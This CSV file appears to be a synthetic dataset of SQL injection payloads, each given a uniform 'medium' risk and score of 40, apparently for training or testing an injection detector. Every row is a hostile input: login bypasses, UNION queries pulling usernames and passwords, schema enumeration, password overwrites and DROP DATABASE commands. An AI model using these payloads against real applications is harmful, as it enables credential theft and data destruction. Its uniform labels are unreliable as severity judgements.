query,risk,score
'; SELECT COUNT(*) FROM users -- OR 1=1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- -- 2bl4,medium,40
'; SELECT @@version -- -- 0pgf,medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
'; UPDATE users SET password='pass' OR 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- AND 1=1,medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- /**/ # ,medium,40
'; SELECT @@version -- AND 1=1,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ # ,medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1,medium,40
'; SELECT COUNT(*) FROM users -- -- eg15,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1,medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
' or 1=1 in (select * from users) -- OR 1=1 -- ,medium,40
'; SELECT @@version -- -- g568,medium,40
1' OR 1=1; SELECT * FROM users -- -- 2n3w,medium,40
'; SELECT @@version -- /**/ # ,medium,40
' HAVING 1=1 # LIMIT 1,medium,40
' OR username LIKE '%admin%' -- -- vjb1,medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1",medium,40
'; DROP DATABASE temp -- -- 68d7,medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1,medium,40
"' UNION SELECT username, password FROM users -- # cxclo",medium,40
'; SELECT @@version -- # k1oal,medium,40
'; UPDATE users SET password='pass' LIMIT 1,medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
1' OR 1=1; SELECT * FROM users -- # nj0y5,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ # ",medium,40
'; DROP DATABASE temp -- AND 1=1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 -- ,medium,40
'; DROP DATABASE temp -- LIMIT 1,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- AND 1=1",medium,40
1' OR 1=1; SELECT * FROM users -- # xcovp,medium,40
' or 1=1 in (select * from users) -- -- tv9y,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 -- ",medium,40
'; SELECT @@version -- -- ijo7,medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 -- ",medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
'; DROP DATABASE temp -- -- rw49,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- 4sm2,medium,40
'; DROP DATABASE temp -- # 0ngew,medium,40
1' OR 1=1; SELECT * FROM users -- -- dhg9,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 9amw",medium,40
'; SELECT @@version -- -- syzx,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- jd7i",medium,40
' OR username LIKE '%admin%' -- LIMIT 1,medium,40
"' UNION SELECT username, password FROM users -- # mmlxr",medium,40
'; DROP DATABASE temp -- -- npln,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # u2fku",medium,40
' OR username LIKE '%admin%' -- LIMIT 1,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- qmgy",medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 -- ,medium,40
' HAVING 1=1 # OR 1=1 -- ,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 9zesf",medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1,medium,40
'; DROP DATABASE temp -- /**/ # ,medium,40
'; UPDATE users SET password='pass' AND 1=1,medium,40
'; DROP DATABASE temp -- AND 1=1,medium,40
' or 1=1 in (select * from users) -- LIMIT 1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1",medium,40
' HAVING 1=1 # LIMIT 1,medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
'; DROP DATABASE temp -- AND 1=1,medium,40
' or 1=1 in (select * from users) -- -- xfyi,medium,40
' UNION SELECT * FROM information_schema.tables -- -- 1nbq,medium,40
'; UPDATE users SET password='pass' OR 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- 22hq,medium,40
'; DROP DATABASE temp -- LIMIT 1,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 7bfou",medium,40
' OR username LIKE '%admin%' -- LIMIT 1,medium,40
'; SELECT COUNT(*) FROM users -- -- 2usa,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ # ",medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ujqx",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- fnrk,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # ",medium,40
'; UPDATE users SET password='pass' OR 1=1 -- ,medium,40
' HAVING 1=1 # /**/ # ,medium,40
' or 1 = 1 LIMIT 1 -- /**/ # ,medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1",medium,40
'; DROP DATABASE temp -- AND 1=1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 42x8",medium,40
' UNION SELECT * FROM information_schema.tables -- # 3t0a4,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 -- ",medium,40
'; DROP DATABASE temp -- LIMIT 1,medium,40
'; UPDATE users SET password='pass' -- iijs,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # ,medium,40
'; DROP DATABASE temp -- AND 1=1,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # ,medium,40
' HAVING 1=1 # # 8cnio,medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1,medium,40
' HAVING 1=1 # # p79f6,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ # ,medium,40
'; DROP DATABASE temp -- /**/ # ,medium,40
' or 1=1 in (select * from users) -- -- 1w8d,medium,40
'; UPDATE users SET password='pass' # cevk7,medium,40
'; SELECT @@version -- LIMIT 1,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # wxqfl",medium,40
'; SELECT @@version -- OR 1=1 -- ,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 -- ",medium,40
' or 1 = 1 LIMIT 1 -- -- 7glr,medium,40
'; DROP DATABASE temp -- AND 1=1,medium,40
'; UPDATE users SET password='pass' # fu3ew,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
' HAVING 1=1 # # puflw,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1",medium,40
'; SELECT @@version -- OR 1=1 -- ,medium,40
"' UNION SELECT username, password FROM users -- /**/ # ",medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ # ,medium,40
"' UNION SELECT username, password FROM users -- /**/ # ",medium,40
'; UPDATE users SET password='pass' AND 1=1,medium,40
' or 1 = 1 LIMIT 1 -- # vtxjj,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/ # ",medium,40
' or 1=1 in (select * from users) -- # s030v,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1",medium,40
' HAVING 1=1 # AND 1=1,medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 -- ",medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1,medium,40
'; SELECT @@version -- /**/ # ,medium,40
' UNION SELECT * FROM information_schema.tables -- OR 1=1 -- ,medium,40
'; SELECT @@version -- AND 1=1,medium,40
' or 1=1 in (select * from users) -- /**/ # ,medium,40
' OR username LIKE '%admin%' -- # unp5b,medium,40
' or 1=1 in (select * from users) -- # o9awv,medium,40
"' UNION SELECT username, password FROM users -- # ltbrf",medium,40
'; DROP DATABASE temp -- -- 8d9c,medium,40
' UNION SELECT * FROM information_schema.tables -- LIMIT 1,medium,40
"' UNION SELECT username, password FROM users -- -- ou18",medium,40
'; SELECT @@version -- AND 1=1,medium,40
'; SELECT @@version -- LIMIT 1,medium,40
1' OR 1=1; SELECT * FROM users -- -- apmf,medium,40
'; DROP DATABASE temp -- AND 1=1,medium,40
1' OR 1=1; SELECT * FROM users -- -- z1my,medium,40
1' OR '1' = '1' GROUP BY 1 -- # urv34,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 4skjt",medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 -- ",medium,40
'; UPDATE users SET password='pass' LIMIT 1,medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1,medium,40
' or 1=1 in (select * from users) -- # vndn1,medium,40
' or 1=1 in (select * from users) -- -- qjgo,medium,40
' OR username LIKE '%admin%' -- AND 1=1,medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1",medium,40
'; DROP DATABASE temp -- OR 1=1 -- ,medium,40
' or 1=1 in (select * from users) -- OR 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1",medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1,medium,40
'; SELECT @@version -- AND 1=1,medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # pascl",medium,40
'; SELECT COUNT(*) FROM users -- -- v9x9,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/ # ,medium,40
"' UNION SELECT username, password FROM users -- -- 5872",medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1,medium,40
'; DROP DATABASE temp -- # 4lyx3,medium,40
' UNION SELECT * FROM information_schema.tables -- OR 1=1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # eq8vj",medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
' or 1=1 in (select * from users) -- -- jrce,medium,40
' or 1=1 in (select * from users) -- # ua6de,medium,40
'; SELECT COUNT(*) FROM users -- -- sa14,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- qjmx",medium,40
' HAVING 1=1 # LIMIT 1,medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
' HAVING 1=1 # -- njgq,medium,40
' UNION SELECT * FROM information_schema.tables -- LIMIT 1,medium,40
'; DROP DATABASE temp -- OR 1=1 -- ,medium,40
'; SELECT @@version -- # fzins,medium,40
' or 1 = 1 LIMIT 1 -- # 92o3e,medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- /**/ # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- 5kim",medium,40
'; SELECT @@version -- -- 1xmc,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/ # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- yp0z",medium,40
'; DROP DATABASE temp -- -- cyh0,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # yqilj",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1",medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
'; UPDATE users SET password='pass' LIMIT 1,medium,40
' OR username LIKE '%admin%' -- LIMIT 1,medium,40
'; DROP DATABASE temp -- /**/ # ,medium,40
1' OR 1=1; SELECT * FROM users -- AND 1=1,medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- -- 5jne,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # ,medium,40
' HAVING 1=1 # # lv320,medium,40
' OR username LIKE '%admin%' -- AND 1=1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 3ool1",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/ # ",medium,40
' or 1=1 in (select * from users) -- /**/ # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1,medium,40
' HAVING 1=1 # # hvqw3,medium,40
' or 1=1 in (select * from users) -- /**/ # ,medium,40
'; SELECT @@version -- /**/ # ,medium,40
'; SELECT COUNT(*) FROM users -- -- oq3d,medium,40
' HAVING 1=1 # -- a8js,medium,40
'; DROP DATABASE temp -- /**/ # ,medium,40
"' UNION SELECT username, password FROM users -- # lwtah",medium,40
'; SELECT COUNT(*) FROM users -- AND 1=1,medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
"' UNION SELECT username, password FROM users -- AND 1=1",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1",medium,40
' or 1=1 in (select * from users) -- LIMIT 1,medium,40
' HAVING 1=1 # AND 1=1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1",medium,40
'; DROP DATABASE temp -- -- 0xwu,medium,40
'; UPDATE users SET password='pass' LIMIT 1,medium,40
1' OR 1=1; SELECT * FROM users -- /**/ # ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 -- ",medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1,medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1",medium,40
'; SELECT @@version -- -- 3mbd,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 -- ",medium,40
' or 1=1 in (select * from users) -- LIMIT 1,medium,40
' HAVING 1=1 # OR 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
' HAVING 1=1 # OR 1=1 -- ,medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1",medium,40
1' OR 1=1; SELECT * FROM users -- # 9ipc1,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- g43f",medium,40
'; UPDATE users SET password='pass' OR 1=1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ # ",medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 -- ,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 -- ,medium,40
'; UPDATE users SET password='pass' # 8s6a7,medium,40
' HAVING 1=1 # OR 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- kn3m,medium,40
' UNION SELECT * FROM information_schema.tables -- OR 1=1 -- ,medium,40
"' UNION SELECT username, password FROM users -- -- wuk8",medium,40
1' OR 1=1; SELECT * FROM users -- -- 5ftb,medium,40
' OR username LIKE '%admin%' -- LIMIT 1,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 -- ",medium,40
'; DROP DATABASE temp -- # evoc1,medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1,medium,40
' HAVING 1=1 # LIMIT 1,medium,40
' or 1 = 1 LIMIT 1 -- -- r5oo,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/ # ,medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
'; DROP DATABASE temp -- /**/ # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # yq7ve",medium,40
' OR username LIKE '%admin%' -- # ontr1,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
'; SELECT @@version -- OR 1=1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- AND 1=1",medium,40
'; UPDATE users SET password='pass' /**/ # ,medium,40
'; UPDATE users SET password='pass' /**/ # ,medium,40
' HAVING 1=1 # OR 1=1 -- ,medium,40
' or 1=1 in (select * from users) -- /**/ # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- o3i7",medium,40
'; SELECT @@version -- OR 1=1 -- ,medium,40
'; SELECT @@version -- /**/ # ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # ",medium,40
' UNION SELECT * FROM information_schema.tables -- -- wj4f,medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # nh0w1",medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/ # ,medium,40
' or 1=1 in (select * from users) -- OR 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- 1h3p,medium,40
1' OR 1=1; SELECT * FROM users -- -- skyf,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 -- ",medium,40
'; UPDATE users SET password='pass' LIMIT 1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- p8yw",medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # ",medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ # ,medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1",medium,40
' or 1 = 1 LIMIT 1 -- /**/ # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- wkaf",medium,40
' HAVING 1=1 # # tzi60,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
'; UPDATE users SET password='pass' LIMIT 1,medium,40
' or 1 = 1 LIMIT 1 -- # prpnv,medium,40
1' OR 1=1; SELECT * FROM users -- -- 0bwj,medium,40
' or 1 = 1 LIMIT 1 -- -- eaq9,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/ # ,medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
'; DROP DATABASE temp -- OR 1=1 -- ,medium,40
'; UPDATE users SET password='pass' LIMIT 1,medium,40
'; UPDATE users SET password='pass' OR 1=1 -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- OR 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # ,medium,40
' UNION SELECT * FROM information_schema.tables -- # y84v3,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # tubgf",medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
' UNION SELECT * FROM information_schema.tables -- -- 6lox,medium,40
'; UPDATE users SET password='pass' LIMIT 1,medium,40
' or 1 = 1 LIMIT 1 -- -- e5wd,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1",medium,40
' or 1=1 in (select * from users) -- LIMIT 1,medium,40
'; SELECT COUNT(*) FROM users -- # vq57d,medium,40
' HAVING 1=1 # LIMIT 1,medium,40
1' OR '1' = '1' GROUP BY 1 -- # ptvpf,medium,40
1' OR 1=1; SELECT * FROM users -- -- 6fi0,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- zaps",medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 -- ,medium,40
'; UPDATE users SET password='pass' OR 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1,medium,40
'; SELECT @@version -- AND 1=1,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
'; UPDATE users SET password='pass' AND 1=1,medium,40
'; DROP DATABASE temp -- /**/ # ,medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- bbrp",medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
' HAVING 1=1 # /**/ # ,medium,40
' or 1=1 in (select * from users) -- /**/ # ,medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1",medium,40
'; UPDATE users SET password='pass' LIMIT 1,medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1",medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 -- ,medium,40
'; DROP DATABASE temp -- OR 1=1 -- ,medium,40
'; SELECT @@version -- LIMIT 1,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- xsno",medium,40
' HAVING 1=1 # AND 1=1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 -- ",medium,40
'; SELECT @@version -- /**/ # ,medium,40
' HAVING 1=1 # AND 1=1,medium,40
'; UPDATE users SET password='pass' # ci2vl,medium,40
'; UPDATE users SET password='pass' LIMIT 1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1",medium,40
'; SELECT @@version -- AND 1=1,medium,40
'; SELECT COUNT(*) FROM users -- AND 1=1,medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # uq79c",medium,40
'; UPDATE users SET password='pass' OR 1=1 -- ,medium,40
'; UPDATE users SET password='pass' OR 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/ # ,medium,40
'; UPDATE users SET password='pass' AND 1=1,medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # fwtr9,medium,40
' UNION SELECT * FROM information_schema.tables -- # stoes,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # sxbqe",medium,40
'; SELECT COUNT(*) FROM users -- -- hwvx,medium,40
'; SELECT @@version -- /**/ # ,medium,40
' OR username LIKE '%admin%' -- LIMIT 1,medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1,medium,40
' UNION SELECT * FROM information_schema.tables -- LIMIT 1,medium,40
' or 1=1 in (select * from users) -- -- 5yz9,medium,40
'; UPDATE users SET password='pass' AND 1=1,medium,40
'; SELECT @@version -- /**/ # ,medium,40
' UNION SELECT * FROM information_schema.tables -- # ar7xj,medium,40
'; SELECT @@version -- AND 1=1,medium,40
1' OR 1=1; SELECT * FROM users -- -- vkdp,medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 -- ",medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1",medium,40
1' OR 1=1; SELECT * FROM users -- # kkna6,medium,40
' or 1=1 in (select * from users) -- OR 1=1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # yhv4f,medium,40
'; DROP DATABASE temp -- OR 1=1 -- ,medium,40
'; UPDATE users SET password='pass' AND 1=1,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
'; SELECT @@version -- AND 1=1,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 -- ",medium,40
'; UPDATE users SET password='pass' # 0unpx,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 -- ",medium,40
' UNION SELECT * FROM information_schema.tables -- -- sjiy,medium,40
1' OR 1=1; SELECT * FROM users -- /**/ # ,medium,40
"' UNION SELECT username, password FROM users -- /**/ # ",medium,40
'; SELECT COUNT(*) FROM users -- -- wi5t,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/ # ,medium,40
'; SELECT @@version -- /**/ # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ # ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
'; DROP DATABASE temp -- OR 1=1 -- ,medium,40
'; UPDATE users SET password='pass' -- ckrx,medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
'; UPDATE users SET password='pass' OR 1=1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- AND 1=1",medium,40
' or 1 = 1 LIMIT 1 -- /**/ # ,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 -- ,medium,40
"' UNION SELECT username, password FROM users -- AND 1=1",medium,40
1' OR 1=1; SELECT * FROM users -- /**/ # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ # ",medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
' HAVING 1=1 # LIMIT 1,medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
'; SELECT @@version -- -- gszo,medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- AND 1=1",medium,40
'; UPDATE users SET password='pass' OR 1=1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- AND 1=1,medium,40
'; SELECT COUNT(*) FROM users -- # 2k4td,medium,40
' or 1=1 in (select * from users) -- -- w7f1,medium,40
"' UNION SELECT username, password FROM users -- # aeykr",medium,40
'; SELECT @@version -- AND 1=1,medium,40
' HAVING 1=1 # -- rxwa,medium,40
'; SELECT @@version -- OR 1=1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- AND 1=1",medium,40
' UNION SELECT * FROM information_schema.tables -- # 7jqn4,medium,40
'; UPDATE users SET password='pass' LIMIT 1,medium,40
' HAVING 1=1 # -- 8dcf,medium,40
'; DROP DATABASE temp -- LIMIT 1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/ # ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- AND 1=1",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1",medium,40
' or 1 = 1 LIMIT 1 -- -- wb8f,medium,40
' or 1 = 1 LIMIT 1 -- -- pxg0,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ # ",medium,40
' or 1 = 1 LIMIT 1 -- # 06a5s,medium,40
' HAVING 1=1 # # nv9ff,medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
' or 1=1 in (select * from users) -- /**/ # ,medium,40
'; UPDATE users SET password='pass' OR 1=1 -- ,medium,40
' HAVING 1=1 # # lvfw1,medium,40
'; UPDATE users SET password='pass' # eoecq,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 -- ,medium,40
"' UNION SELECT username, password FROM users -- AND 1=1",medium,40
'; DROP DATABASE temp -- /**/ # ,medium,40
' UNION SELECT * FROM information_schema.tables -- LIMIT 1,medium,40
'; SELECT @@version -- # x8me8,medium,40
'; DROP DATABASE temp -- /**/ # ,medium,40
'; SELECT @@version -- -- b24n,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 -- ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1",medium,40
' HAVING 1=1 # AND 1=1,medium,40
"' UNION SELECT username, password FROM users -- -- sr3m",medium,40
